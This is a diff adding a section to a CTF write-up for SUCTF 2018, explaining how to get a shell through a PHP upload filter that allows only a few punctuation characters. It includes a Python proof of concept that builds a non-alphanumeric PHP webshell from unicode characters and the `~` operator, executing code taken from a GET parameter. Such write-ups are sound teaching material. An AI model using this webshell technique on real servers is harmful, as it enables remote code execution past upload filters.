@@ -1,9 +1,9 @@
 # SUCTF 2018
 
-
  - [SUCTF 2018](#suctf-2018)
    - [web](#web)
      - [Anonymous (bookgin)](#anonymous-bookgin)
+     - [Getshell (unsolved, written bookgin)](#getshell-unsolved-written-bookgin)
    - [rev](#rev)
      - [python (sasdf)](#python-sasdf)
      - [Enigma (sasdf)](#enigma-sasdf)
@@ -40,6 +40,46 @@ Exploit:
 1. Make Apache fork, refer to [Orange's script](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/baby%5Eh-master-php-2017/fork.py). It's intended to reset the index of lambda function. 
 2. Get flag via `http://web.suctf.asuri.org:81/?func_name=%00lambda_1`
 
+### Getshell (unsolved, written bookgin)
+
+I'm stuck in this problem for about a day, and I really desperate for the writeup. So let me put the reference first(respect!):
+
+Reference:
+1. [白帽100安全攻防实验室](https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&mid=2247484003&idx=1&sn=e27b4e770b3a16245026013545474056&chksm=9760f6b5a0177fa35f21d0260a798a5b774644d45ab74af0e1e74eabbdd4520296a190ada01e&mpshare=1&scene=23&srcid=0528VpCYK8o8P9iyzHwB9thX#rd)
+2. [phithon's blog](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
+
+
+In this problem, you can upload filename with extension `php`. However, there are some constraint: except for the first 5 characters, the php shell can only contain `$().;=[]_~\n`.
+
+Because the php [short tag](http://php.net/manual/en/language.basic-syntax.phptags.php) is not enabled, the first 5 characters have to be `<?php`. However, how to create a php shell with `$().;=[]_~\n` and unicode characters?
+
+After a few tries, and taking advantage of PHP, I can only create strings "Array", "1", which is definitely not enough to create a webshell.
+
+The key point is:
+```php
+php > var_dump(臺[1]);
+PHP Warning:  Use of undefined constant 臺 - assumed '臺' (this will throw an Error in a future version of PHP) in php shell code on line 1
+string(1) "�"
+```
+Although the unicode character 臺 (which means Tai in Chinese) is not put in quotes, it can still be interpreted. Thank you, PHP!
+
+But the unicode character doesn't contain any ASCII character in case of character set confusion. We can utilize `~` to bypass this.
+
+Here is a PoC. The challenge server uses PHP 5, so `assert` can be used as a dynamic function to RCE.
+
+```python
+#!/usr/bin/env python3
+# Python 3.6.5
+
+def toUnicode(c):
+    byte = 255-ord(c)
+    return bytes([0xe4, byte, 0x80]).decode()
+
+print('$_=_==_;') # True, because NULL == NULL
+print('$__=' + '.'.join([f'~{toUnicode(c)}[$_]' for c in 'printf']) + ';') # string(4) "printf"
+print('$___=' + '.'.join([f'~{toUnicode(c)}[$_]' for c in '_GET']) + ';') # string(4) "_GET"
+print(f'$__($$___[$_]);') # $$___[$_] means $_GET["1"]
+```
 
 ## rev
 ### python (sasdf)
